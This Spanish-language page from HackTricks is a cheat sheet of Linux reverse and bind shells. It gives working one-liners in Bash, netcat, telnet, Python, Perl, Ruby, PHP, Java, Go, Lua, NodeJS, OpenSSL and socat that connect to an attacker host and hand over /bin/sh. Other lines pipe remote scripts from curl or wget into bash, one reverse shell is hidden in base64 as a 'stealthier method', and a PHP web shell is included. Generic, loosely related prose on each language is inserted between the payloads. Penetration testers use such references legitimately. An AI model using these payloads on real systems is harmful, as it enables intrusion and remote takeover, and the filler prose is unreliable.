# Shells - Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra las vulnerabilidades que más importan para que puedas solucionarlas más rápido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnológica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**Si tienes preguntas sobre alguno de estos shells, puedes consultarlos en** [**https://explainshell.com/**](https://explainshell.com)

## TTY completo

**Una vez que obtengas un shell inverso**[ **lee esta página para obtener un TTY completo**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
No olvides verificar con otros shells: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh y bash.

### Shell seguro de símbolos
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Explicación del shell

1. **`bash -i`**: Esta parte del comando inicia un shell interactivo (`-i`) de Bash.
2. **`>&`**: Esta parte del comando es una notación abreviada para **redirigir tanto la salida estándar** (`stdout`) como el **error estándar** (`stderr`) al **mismo destino**.
3. **`/dev/tcp/<DIRECCIÓN-IP-DEL-ATAQUE>/<PUERTO>`**: Este es un archivo especial que **representa una conexión TCP a la dirección IP y puerto especificados**.
* Al **redirigir las salidas y errores a este archivo**, el comando envía efectivamente la salida de la sesión del shell interactivo a la máquina del atacante.
4. **`0>&1`**: Esta parte del comando **redirige la entrada estándar (`stdin`) al mismo destino que la salida estándar (`stdout`)**.

### Crear en archivo y ejecutar
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Shell hacia adelante

Puede haber casos en los que tenga una **Ejecución de Código Remoto (RCE) en una aplicación web en una máquina Linux**, pero debido a reglas de Iptables u otros tipos de filtrado, **no puede obtener una shell inversa**. Esta "shell" le permite mantener una shell PTY a través de esa RCE utilizando tuberías dentro del sistema de la víctima.\
Puede encontrar el código en [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)

Solo necesita modificar:

* La URL del host vulnerable
* El prefijo y sufijo de su carga útil (si corresponde)
* La forma en que se envía la carga útil (¿encabezados? ¿datos? ¿información adicional?)

Luego, simplemente puede **enviar comandos** o incluso **usar el comando `upgrade`** para obtener una shell PTY completa (tenga en cuenta que las tuberías se leen y escriben con un retraso aproximado de 1.3 segundos).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

Verifícalo en [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Telnet es un protocolo de red que permite la comunicación remota con un servidor a través de una conexión de texto sin cifrar. Es ampliamente utilizado para administrar dispositivos de red y servidores remotos.

### Uso de Telnet

Para utilizar Telnet, debes tener instalado un cliente Telnet en tu máquina local. Puedes conectarte a un servidor remoto utilizando el siguiente comando:

```
telnet <dirección IP> <puerto>
```

Reemplaza `<dirección IP>` con la dirección IP del servidor al que deseas conectarte y `<puerto>` con el número de puerto correspondiente.

Una vez que te hayas conectado al servidor, podrás enviar comandos y recibir respuestas a través de la conexión Telnet.

### Riesgos de seguridad

Debido a que Telnet no cifra los datos transmitidos, es altamente vulnerable a ataques de interceptación y manipulación de datos. Esto significa que cualquier persona que pueda interceptar el tráfico de red puede ver y modificar la información transmitida a través de Telnet.

Por esta razón, se recomienda encarecidamente utilizar protocolos de comunicación más seguros, como SSH, en lugar de Telnet. SSH cifra los datos transmitidos, lo que proporciona una capa adicional de seguridad.

### Conclusión

Telnet es un protocolo de comunicación remota ampliamente utilizado, pero no es seguro debido a la falta de cifrado. Es importante tener en cuenta los riesgos de seguridad asociados con Telnet y considerar el uso de protocolos más seguros para la comunicación remota.
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**Atacante**
```bash
while true; do nc -l <port>; done
```
Para enviar el comando, escríbelo, presiona enter y luego presiona CTRL+D (para detener STDIN)

**Víctima**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

Python is a versatile and powerful programming language that is widely used in the field of hacking. It provides a wide range of libraries and modules that can be leveraged for various hacking tasks. In this section, we will explore some of the common Python libraries and techniques used in hacking.

### Python Shells

A Python shell is an interactive environment that allows you to execute Python code and get immediate feedback. It is a useful tool for testing and experimenting with code snippets. There are several Python shells available, including the standard Python shell, IPython, and Jupyter Notebook.

#### Standard Python Shell

The standard Python shell is a basic interactive interpreter that comes with the Python installation. It allows you to execute Python code line by line and see the results immediately. To start the standard Python shell, open a terminal or command prompt and type `python`.

#### IPython

IPython is an enhanced Python shell that provides additional features and capabilities compared to the standard Python shell. It includes features such as tab completion, syntax highlighting, and support for interactive data visualization. To start IPython, open a terminal or command prompt and type `ipython`.

#### Jupyter Notebook

Jupyter Notebook is a web-based interactive computing environment that allows you to create and share documents containing live code, equations, visualizations, and narrative text. It supports various programming languages, including Python. Jupyter Notebook provides a rich set of features for data analysis, visualization, and machine learning. To start Jupyter Notebook, open a terminal or command prompt and type `jupyter notebook`.

### Python Libraries for Hacking

Python provides a wide range of libraries and modules that can be used for hacking purposes. Some of the commonly used libraries include:

- **Requests**: A library for making HTTP requests and interacting with web services.
- **Beautiful Soup**: A library for parsing HTML and XML documents.
- **Scapy**: A powerful interactive packet manipulation program.
- **Paramiko**: A library for implementing SSHv2 protocol.
- **Pycrypto**: A collection of cryptographic algorithms and protocols.
- **Selenium**: A library for automating web browsers.
- **Pillow**: A library for image processing and manipulation.
- **Pygame**: A library for creating games and multimedia applications.

These libraries provide a wide range of functionality that can be leveraged for various hacking tasks, such as web scraping, network scanning, exploit development, and more.

### Python Frameworks for Hacking

In addition to libraries, there are also several Python frameworks that can be used for hacking purposes. These frameworks provide a higher-level abstraction and a set of tools and utilities for building hacking tools and conducting penetration testing. Some of the popular Python frameworks for hacking include:

- **Metasploit Framework**: A powerful framework for developing, testing, and executing exploits.
- **Scapy**: A framework for packet crafting and network scanning.
- **The Social-Engineer Toolkit (SET)**: A framework for social engineering attacks.
- **BeEF**: A framework for browser exploitation.
- **OWASP ZAP**: An open-source web application security scanner.

These frameworks provide a comprehensive set of tools and utilities for various hacking tasks, such as vulnerability assessment, exploit development, and social engineering attacks.

### Conclusion

Python is a versatile programming language that is widely used in the field of hacking. It provides a wide range of libraries and frameworks that can be leveraged for various hacking tasks. Whether you are a beginner or an experienced hacker, Python can be a valuable tool in your arsenal.
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl

Perl es un lenguaje de programación interpretado y versátil que se utiliza ampliamente en el desarrollo de scripts y aplicaciones web. Es especialmente útil para la manipulación de texto y el procesamiento de datos. Perl ofrece una amplia gama de funciones y módulos que facilitan la creación de scripts eficientes y potentes.

### Ejecución de comandos

Perl proporciona varias formas de ejecutar comandos en un sistema Linux. Una forma común es utilizar la función `system`, que ejecuta un comando y muestra su salida en la consola. Aquí hay un ejemplo:

```perl
system("ls -l");
```

Este comando ejecutará el comando `ls -l` y mostrará el resultado en la consola.

### Manipulación de archivos

Perl también es útil para la manipulación de archivos en un sistema Linux. Puede abrir, leer, escribir y cerrar archivos utilizando las funciones incorporadas de Perl. Aquí hay un ejemplo de cómo abrir y leer un archivo:

```perl
open(my $archivo, '<', 'archivo.txt') or die "No se pudo abrir el archivo: $!";
while (my $linea = <$archivo>) {
    chomp $linea;
    print "$linea\n";
}
close($archivo);
```

Este código abrirá el archivo `archivo.txt`, leerá cada línea y la imprimirá en la consola.

### Expresiones regulares

Perl es conocido por su poderoso soporte de expresiones regulares. Las expresiones regulares son patrones utilizados para buscar y manipular texto. Perl proporciona una sintaxis concisa y flexible para trabajar con expresiones regulares. Aquí hay un ejemplo de cómo buscar una cadena en un archivo utilizando una expresión regular:

```perl
open(my $archivo, '<', 'archivo.txt') or die "No se pudo abrir el archivo: $!";
while (my $linea = <$archivo>) {
    if ($linea =~ /patrón/) {
        print "$linea\n";
    }
}
close($archivo);
```

Este código buscará el patrón especificado en cada línea del archivo y mostrará las líneas que coincidan con el patrón.

### Conclusiones

Perl es un lenguaje de programación poderoso y flexible que ofrece muchas funcionalidades útiles para la administración de sistemas Linux. Desde la ejecución de comandos hasta la manipulación de archivos y el uso de expresiones regulares, Perl es una herramienta valiosa para cualquier hacker o administrador de sistemas.
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby es un lenguaje de programación dinámico y orientado a objetos. Es conocido por su elegante sintaxis y su enfoque en la simplicidad y la productividad. Ruby es ampliamente utilizado en el desarrollo web y es compatible con una amplia gama de frameworks y bibliotecas.

### Introducción a Ruby

Ruby fue creado en 1995 por Yukihiro Matsumoto, también conocido como Matz. Matz diseñó Ruby con el objetivo de combinar la facilidad de uso de Perl con la orientación a objetos de Smalltalk. El resultado es un lenguaje que es fácil de leer y escribir, y que permite a los programadores expresar sus ideas de manera clara y concisa.

### Características de Ruby

Ruby tiene varias características que lo hacen único y poderoso:

- **Sintaxis elegante**: Ruby tiene una sintaxis limpia y fácil de leer, lo que facilita la comprensión del código.

- **Orientación a objetos**: Todo en Ruby es un objeto, lo que significa que se pueden aplicar métodos y propiedades a cualquier valor.

- **Metaprogramación**: Ruby permite la metaprogramación, lo que significa que los programas pueden modificar su propia estructura y comportamiento en tiempo de ejecución.

- **Gestión automática de memoria**: Ruby cuenta con un recolector de basura que se encarga de liberar la memoria utilizada por los objetos que ya no son necesarios.

### Ejecución de código Ruby

Para ejecutar código Ruby, se puede utilizar el intérprete de línea de comandos de Ruby, que se instala junto con el lenguaje. Simplemente se debe escribir el código en un archivo con extensión `.rb` y luego ejecutarlo con el comando `ruby nombre_del_archivo.rb`.

También existen entornos de desarrollo integrados (IDE) que ofrecen características adicionales para el desarrollo en Ruby, como resaltado de sintaxis, depuración y autocompletado de código.

### Frameworks populares de Ruby

Ruby cuenta con una amplia variedad de frameworks populares que facilitan el desarrollo web. Algunos de los más conocidos son:

- **Ruby on Rails**: Ruby on Rails, también conocido como Rails, es un framework de desarrollo web que sigue el patrón de diseño Modelo-Vista-Controlador (MVC). Rails es conocido por su enfoque en la convención sobre la configuración, lo que permite a los desarrolladores ser más productivos.

- **Sinatra**: Sinatra es un framework minimalista para el desarrollo de aplicaciones web en Ruby. Es fácil de aprender y usar, y es ideal para proyectos pequeños y rápidos.

- **Hanami**: Hanami es un framework web modular y de alto rendimiento para Ruby. Está diseñado para ser flexible y escalable, y se centra en la arquitectura de aplicaciones empresariales.

Estos frameworks proporcionan una estructura y herramientas para facilitar el desarrollo de aplicaciones web en Ruby, lo que permite a los desarrolladores crear aplicaciones de manera más eficiente y rápida.
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP es un lenguaje de programación ampliamente utilizado para el desarrollo web. Es especialmente popular debido a su facilidad de uso y su capacidad para interactuar con bases de datos y generar contenido dinámico en el lado del servidor.

### Shell PHP

Un shell PHP es una forma de ejecutar comandos en un servidor web utilizando el lenguaje de programación PHP. Esto puede ser útil durante una prueba de penetración para obtener acceso a un sistema remoto y ejecutar comandos en él.

#### Ejecución de comandos

Para ejecutar comandos en un shell PHP, se puede utilizar la función `system()` o `exec()`. Estas funciones permiten ejecutar comandos del sistema operativo y capturar su salida.

```php
<?php
$command = $_GET['cmd'];
$output = system($command);
echo $output;
?>
```

En el ejemplo anterior, el comando se pasa como un parámetro en la URL y se ejecuta utilizando la función `system()`. La salida del comando se captura en la variable `$output` y se muestra en la página.

Es importante tener en cuenta que ejecutar comandos en un shell PHP puede ser peligroso si no se toman las precauciones adecuadas. Es recomendable validar y filtrar cualquier entrada del usuario para evitar la ejecución de comandos maliciosos.

#### Reverse Shell PHP

Un reverse shell PHP es una técnica utilizada para establecer una conexión inversa desde un servidor remoto a una máquina controlada por el atacante. Esto permite al atacante obtener acceso a la máquina remota y ejecutar comandos en ella.

```php
<?php
$ip = '192.168.0.1';
$port = 1234;
$shell = "/bin/bash";
$cmd = 'bash -i >& /dev/tcp/' . $ip . '/' . $port . ' 0>&1';
system($cmd);
?>
```

En el ejemplo anterior, se establece una conexión inversa utilizando la función `system()` de PHP. El atacante especifica la dirección IP y el puerto al que desea conectarse, así como el intérprete de comandos que se utilizará en la máquina remota.

Es importante tener en cuenta que el uso de un reverse shell PHP puede ser ilegal y solo debe realizarse con permiso explícito del propietario del sistema remoto.
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Java es un lenguaje de programación de alto nivel y orientado a objetos. Es ampliamente utilizado en el desarrollo de aplicaciones empresariales y en la creación de aplicaciones para dispositivos móviles. Java es conocido por su portabilidad, lo que significa que las aplicaciones escritas en Java pueden ejecutarse en diferentes plataformas sin necesidad de realizar modificaciones significativas.

### Características principales de Java

- **Orientado a objetos**: Java se basa en el paradigma de programación orientada a objetos, lo que significa que se centra en la creación de objetos que contienen datos y métodos.

- **Portabilidad**: Las aplicaciones Java pueden ejecutarse en diferentes plataformas, como Windows, macOS y Linux, sin necesidad de realizar cambios en el código fuente.

- **Seguridad**: Java tiene un modelo de seguridad robusto que protege las aplicaciones de posibles amenazas, como la ejecución de código malicioso.

- **Multihilo**: Java admite la programación multihilo, lo que permite la ejecución simultánea de múltiples hilos de ejecución dentro de una aplicación.

- **Librerías estándar**: Java cuenta con una amplia colección de librerías estándar que proporcionan funcionalidades predefinidas para tareas comunes, como el manejo de archivos, la manipulación de cadenas y la comunicación en red.

### Entorno de desarrollo Java

Para desarrollar aplicaciones Java, es necesario contar con un entorno de desarrollo integrado (IDE, por sus siglas en inglés). Algunos de los IDE más populares para Java son:

- **Eclipse**: Eclipse es un IDE de código abierto que ofrece una amplia gama de características y herramientas para el desarrollo de aplicaciones Java.

- **IntelliJ IDEA**: IntelliJ IDEA es un IDE comercial que se destaca por su potente conjunto de herramientas y su capacidad de análisis estático del código.

- **NetBeans**: NetBeans es otro IDE de código abierto que proporciona un entorno de desarrollo completo para aplicaciones Java.

### Compilación y ejecución de programas Java

Los programas Java se escriben en archivos con extensión `.java` y deben compilarse antes de poder ejecutarse. El compilador de Java, llamado `javac`, convierte el código fuente Java en bytecode, que es un formato de código intermedio que puede ser interpretado por la máquina virtual de Java (JVM, por sus siglas en inglés).

Una vez que el programa ha sido compilado, se puede ejecutar utilizando el comando `java`. La JVM carga el bytecode y lo ejecuta, produciendo la salida correspondiente.

### Ejemplo de programa Java

A continuación se muestra un ejemplo de un programa Java simple que imprime "¡Hola, mundo!" en la consola:

```java
public class HelloWorld {
    public static void main(String[] args) {
        System.out.println("¡Hola, mundo!");
    }
}
```

Este programa define una clase llamada `HelloWorld` con un método `main` que imprime el mensaje "¡Hola, mundo!" utilizando el método `println` de la clase `System`.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat es una herramienta de línea de comandos que proporciona funcionalidad similar a la del comando `netcat`. Permite la transferencia de datos a través de redes utilizando diferentes protocolos, como TCP, UDP y SCTP.

### Instalación

Ncat está disponible en la mayoría de las distribuciones de Linux y se puede instalar utilizando el administrador de paquetes predeterminado. Por ejemplo, en Ubuntu, puedes instalarlo ejecutando el siguiente comando:

```
sudo apt-get install ncat
```

### Uso básico

Una vez instalado, puedes utilizar Ncat para establecer conexiones de red y transferir datos. Aquí hay algunos ejemplos de uso básico:

- Establecer una conexión TCP a un servidor remoto:

```
ncat <dirección IP> <puerto>
```

- Escuchar en un puerto específico y mostrar los datos recibidos:

```
ncat -l <puerto>
```

- Enviar datos a un servidor remoto a través de UDP:

```
ncat -u <dirección IP> <puerto>
```

### Características avanzadas

Ncat también ofrece varias características avanzadas que pueden ser útiles en situaciones específicas. Algunas de estas características incluyen:

- Soporte para autenticación utilizando SSL/TLS.
- Capacidad de redireccionar puertos y reenviar conexiones.
- Posibilidad de ejecutar comandos remotos en el servidor utilizando la opción `--exec`.
- Funcionalidad de escucha persistente utilizando la opción `--listen`.

### Conclusiones

Ncat es una herramienta poderosa que puede ser utilizada para una variedad de tareas relacionadas con la transferencia de datos a través de redes. Ya sea que necesites establecer conexiones TCP, enviar datos a través de UDP o utilizar características avanzadas como la autenticación SSL/TLS, Ncat puede ser una opción confiable.
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra las vulnerabilidades que más importan para que puedas solucionarlas más rápido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnológica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua es un lenguaje de programación ligero y de propósito general que se utiliza comúnmente en el desarrollo de juegos y aplicaciones embebidas. Es conocido por su simplicidad, eficiencia y facilidad de integración con otros lenguajes. Lua se ejecuta en una máquina virtual y se puede utilizar tanto como lenguaje de scripting como para desarrollar aplicaciones completas.

### Características principales de Lua

- **Simplicidad**: Lua tiene una sintaxis simple y clara que facilita su aprendizaje y uso. Su conjunto de características es pequeño pero poderoso, lo que lo hace ideal para proyectos pequeños y grandes.

- **Portabilidad**: Lua es altamente portátil y se puede ejecutar en una amplia variedad de plataformas, incluyendo Windows, macOS, Linux y dispositivos embebidos. Esto lo convierte en una opción popular para el desarrollo multiplataforma.

- **Eficiencia**: Lua está diseñado para ser rápido y eficiente en términos de uso de memoria y rendimiento. Su implementación compacta y su recolector de basura eficiente lo hacen adecuado para aplicaciones con recursos limitados.

- **Integración**: Lua se puede integrar fácilmente con otros lenguajes, lo que permite aprovechar las fortalezas de cada uno. Es común ver a Lua utilizado como lenguaje de scripting en aplicaciones escritas en C/C++.

### Uso de Lua en hacking

Lua también se utiliza en el ámbito del hacking, especialmente en el desarrollo de exploits y herramientas de hacking. Su simplicidad y facilidad de integración lo hacen atractivo para los hackers que desean crear scripts personalizados para sus actividades.

Algunas de las formas en que Lua se utiliza en el hacking incluyen:

- **Automatización de tareas**: Lua se puede utilizar para automatizar tareas repetitivas en el hacking, como el escaneo de puertos, la enumeración de servicios y la explotación de vulnerabilidades.

- **Desarrollo de exploits**: Lua se puede utilizar para desarrollar exploits personalizados para aprovechar vulnerabilidades en sistemas y aplicaciones.

- **Creación de herramientas de hacking**: Lua se puede utilizar para crear herramientas de hacking personalizadas, como scanners de vulnerabilidades, sniffers de red y herramientas de inyección de código.

En resumen, Lua es un lenguaje de programación versátil que se utiliza tanto en el desarrollo de juegos y aplicaciones embebidas como en el ámbito del hacking. Su simplicidad, portabilidad y eficiencia lo convierten en una opción popular para los hackers que buscan automatizar tareas y desarrollar herramientas personalizadas.
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

NodeJS es un entorno de ejecución de JavaScript basado en el motor V8 de Google Chrome. Es ampliamente utilizado para desarrollar aplicaciones de servidor y permite a los desarrolladores utilizar JavaScript tanto en el lado del cliente como en el lado del servidor.

### Instalación de NodeJS

Para instalar NodeJS en Linux, puedes seguir los siguientes pasos:

1. Abre una terminal y ejecuta el siguiente comando para actualizar los paquetes del sistema:

```
sudo apt update
```

2. Luego, instala el paquete `curl` si aún no lo tienes instalado:

```
sudo apt install curl
```

3. A continuación, descarga el instalador de NodeJS utilizando `curl`:

```
curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -
```

4. Una vez que se haya descargado el instalador, instala NodeJS ejecutando el siguiente comando:

```
sudo apt install nodejs
```

5. Verifica que NodeJS se haya instalado correctamente ejecutando los siguientes comandos:

```
node -v
npm -v
```

### Creación de una aplicación NodeJS

Para crear una aplicación NodeJS, sigue estos pasos:

1. Crea una nueva carpeta para tu aplicación:

```
mkdir mi-aplicacion
cd mi-aplicacion
```

2. Inicializa un proyecto NodeJS ejecutando el siguiente comando:

```
npm init
```

3. Sigue las instrucciones en pantalla para configurar tu proyecto. Puedes presionar Enter para aceptar los valores predeterminados o ingresar tus propias configuraciones.

4. Una vez que hayas configurado tu proyecto, puedes comenzar a instalar paquetes de NodeJS utilizando `npm`. Por ejemplo, para instalar el paquete `express`, ejecuta el siguiente comando:

```
npm install express
```

5. Ahora puedes crear un archivo JavaScript para tu aplicación y comenzar a escribir tu código.

### Ejecución de una aplicación NodeJS

Para ejecutar una aplicación NodeJS, sigue estos pasos:

1. Abre una terminal y navega hasta la carpeta de tu aplicación.

2. Ejecuta el siguiente comando para iniciar tu aplicación:

```
node nombre-del-archivo.js
```

3. Tu aplicación NodeJS ahora se ejecutará y podrás acceder a ella a través de tu navegador web.

### Conclusiones

NodeJS es una poderosa plataforma para desarrollar aplicaciones de servidor utilizando JavaScript. Con su amplia gama de paquetes y su facilidad de uso, NodeJS se ha convertido en una opción popular entre los desarrolladores. Sigue los pasos anteriores para instalar NodeJS y comenzar a crear tus propias aplicaciones NodeJS.
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

El Atacante (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
El objetivo
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Shell de enlace
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### Shell inverso

Un shell inverso es una técnica utilizada en hacking para establecer una conexión remota entre un atacante y una máquina comprometida. En lugar de que el atacante se conecte directamente al objetivo, el objetivo se conecta al atacante, lo que permite al atacante ejecutar comandos en la máquina comprometida.

El proceso de establecer un shell inverso generalmente implica las siguientes etapas:

1. El atacante explota una vulnerabilidad en el sistema objetivo para obtener acceso a la máquina comprometida.
